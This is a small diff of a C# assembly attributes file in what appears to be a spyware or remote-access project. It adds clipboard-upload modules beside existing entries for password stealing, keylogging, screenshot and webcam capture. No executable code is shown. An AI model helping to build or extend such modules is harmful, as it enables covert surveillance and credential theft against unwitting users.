@@ -16,6 +16,8 @@
 [assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/steal_password.exe")]
 [assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/sync.exe")]
 [assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/sync_up.exe")]
+[assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/upclipboardimg.exe")]
+[assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/upclipboardtext.exe")]
 [assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/upkeystrokelog.exe")]
 [assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/upscreenshot.exe")]
 [assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/upwebcamlog.exe")]
